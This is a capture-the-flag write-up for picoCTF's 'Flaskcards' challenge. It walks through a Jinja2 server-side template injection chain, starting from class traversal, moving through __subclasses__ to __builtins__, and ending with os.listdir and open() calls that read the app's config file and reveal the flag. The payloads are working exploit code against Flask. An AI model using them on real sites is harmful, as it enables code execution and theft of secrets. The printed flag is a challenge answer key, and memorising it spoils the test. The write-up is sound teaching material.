# Flaskcards
Web Exploitation, 350 points

## Description:
> We found this fishy **website** for flashcards that we think may be sending secrets. Could you take a look? 



## Solution:

The website was a simple "Flashcard" system, allowing the user to create question-answer pairs and then view them:

Card creation:

![Flask](images/Flaskcards_1.png)

Listing the cards:

![Flask](images/Flaskcards_2.png)

Clicking the "Admin" link led to a page stating that "You Are Not An Admin!".

The name of the challenge hints that it is related to Flask - a micro web framework written in Python. One of the known attacks related to Flask is called [template injection](https://nvisium.com/blog/2015/12/07/injecting-flask.html): We input python code encapsulated in double curly brackets and it gets executed by the template manager.

We start with a small proof of concept:
```
{{''.__class__}}
```

The result is:
```
<class 'str'> 
```

From there, we start building our way up:

```
Input:
{{''.__class__.mro()}}

Output:
[<class 'str'>, <class 'object'>]

--

Input:
{{''.__class__.mro()[1].__subclasses__()}}

Output:
[<class 'itertools.compress'>, <class 'formatteriterator'>, [...], <class 'wtforms.validators.UUID'>, <class 'str_iterator'>, <class 'apscheduler.triggers.base.BaseTrigger'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'warnings.catch_warnings'>] 
--

Input:
{{''.__class__.mro()[1].__subclasses__()[703]}}

Output:
<class 'warnings.catch_warnings'> 
--

Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__}}

Output:
{'None': None, 'BufferError': <class 'BufferError'>, 'True': True, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'max': <built-in function max>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ImportError': <class 'ImportError'>, 'Warning': <class 'Warning'>, 'FutureWarning': <class 'FutureWarning'>, '__import__': <built-in function __import__>, 'hex': <built-in function hex>, 'NotImplemented': NotImplemented, 'open': <built-in function open>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'compile': <built-in function compile>, 'bytes': <class 'bytes'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'OSError': <class 'OSError'>, 'copyright': Copyright (c) 2001-2016 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'IndentationError': <class 'IndentationError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'delattr': <built-in function delattr>, 'property': <class 'property'>, 'SystemExit': <class 'SystemExit'>, 'ValueError': <class 'ValueError'>, 'ConnectionError': <class 'ConnectionError'>, 'UnicodeError': <class 'UnicodeError'>, 'Ellipsis': Ellipsis, 'setattr': <built-in function setattr>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'sorted': <built-in function sorted>, 'round': <built-in function round>, 'eval': <built-in function eval>, 'UnboundLocalError': <class 'UnboundLocalError'>, '__name__': 'builtins', 'UserWarning': <class 'UserWarning'>, 'vars': <built-in function vars>, 'list': <class 'list'>, 'IOError': <class 'OSError'>, 'map': <class 'map'>, 'complex': <class 'complex'>, 'zip': <class 'zip'>, 'RuntimeError': <class 'RuntimeError'>, 'sum': <built-in function sum>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'hash': <built-in function hash>, '__debug__': True, 'False': False, 'int': <class 'int'>, 'min': <built-in function min>, 'next': <built-in function next>, 'slice': <class 'slice'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), 'ArithmeticError': <class 'ArithmeticError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'IndexError': <class 'IndexError'>, 'bin': <built-in function bin>, 'bytearray': <class 'bytearray'>, 'FileExistsError': <class 'FileExistsError'>, 'staticmethod': <class 'staticmethod'>, 'NameError': <class 'NameError'>, 'BaseException': <class 'BaseException'>, 'frozenset': <class 'frozenset'>, 'divmod': <built-in function divmod>, 'set': <class 'set'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'reversed': <class 'reversed'>, 'enumerate': <class 'enumerate'>, 'EOFError': <class 'EOFError'>, 'SystemError': <class 'SystemError'>, 'any': <built-in function any>, 'exec': <built-in function exec>, 'chr': <built-in function chr>, 'BytesWarning': <class 'BytesWarning'>, '__build_class__': <built-in function __build_class__>, '__package__': '', 'ascii': <built-in function ascii>, 'StopIteration': <class 'StopIteration'>, 'iter': <built-in function iter>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'getattr': <built-in function getattr>, 'ImportWarning': <class 'ImportWarning'>, 'GeneratorExit': <class 'GeneratorExit'>, 'isinstance': <built-in function isinstance>, 'EnvironmentError': <class 'OSError'>, 'license': Type license() to see the full license text, 'BrokenPipeError': <class 'BrokenPipeError'>, 'tuple': <class 'tuple'>, '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 'issubclass': <built-in function issubclass>, 'format': <built-in function format>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'float': <class 'float'>, 'NotImplementedError': <class 'NotImplementedError'>, 'ord': <built-in function ord>, 'dict': <class 'dict'>, 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'NotADirectoryError': <class 'NotADirectoryError'>, 'AttributeError': <class 'AttributeError'>, 'pow': <built-in function pow>, 'TabError': <class 'TabError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'ReferenceError': <class 'ReferenceError'>, 'Exception': <class 'Exception'>, 'RecursionError': <class 'RecursionError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'abs': <built-in function abs>, 'dir': <built-in function dir>, 'bool': <class 'bool'>, 'ChildProcessError': <class 'ChildProcessError'>, 'range': <class 'range'>, 'str': <class 'str'>, 'callable': <built-in function callable>, 'OverflowError': <class 'OverflowError'>, 'oct': <built-in function oct>, 'help': Type help() for interactive help, or help(object) for help about object., 'memoryview': <class 'memoryview'>, 'SyntaxError': <class 'SyntaxError'>, 'super': <class 'super'>, 'object': <class 'object'>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'print': <built-in function print>, 'ResourceWarning': <class 'ResourceWarning'>, 'LookupError': <class 'LookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'filter': <class 'filter'>, 'KeyError': <class 'KeyError'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'AssertionError': <class 'AssertionError'>, 'MemoryError': <class 'MemoryError'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'input': <built-in function input>, 'len': <built-in function len>, 'id': <built-in function id>, 'type': <class 'type'>, 'globals': <built-in function globals>, 'classmethod': <class 'classmethod'>, 'all': <built-in function all>, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 'locals': <built-in function locals>, 'repr': <built-in function repr>, 'hasattr': <built-in function hasattr>, 'TypeError': <class 'TypeError'>} 
```

Now we can call builtins such as `open` and `__import__`:
```
Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__.__import__('os').listdir('.')}}

Output:
['app', 'xinet_startup.sh', 'server.py']


Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__.__import__('os').listdir('app')}}

Output:
['helpers.py', 'config.py', '__init__.py', 'templates', 'routes.py', 'models.py']

Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__.__import__('os').path.join('app','config.py')).read()}}

Output:
import os basedir = os.path.abspath(os.path.dirname(__file__)) class Config(object): SECRET_KEY = 'picoCTF{secret_keys_to_the_kingdom_2a7bf92c}' #SQLALCHEMY_DATABASE_URI = os.environ.get('DATABSE_URL') or 'sqlite:///'+os.path.join(basedir,'app.db') SQLALCHEMY_DATABASE_URI = "sqlite://" SQLALCHEMY_TRACK_MODIFICATIONS = False 
```

The flag: picoCTF{secret_keys_to_the_kingdom_2a7bf92c}
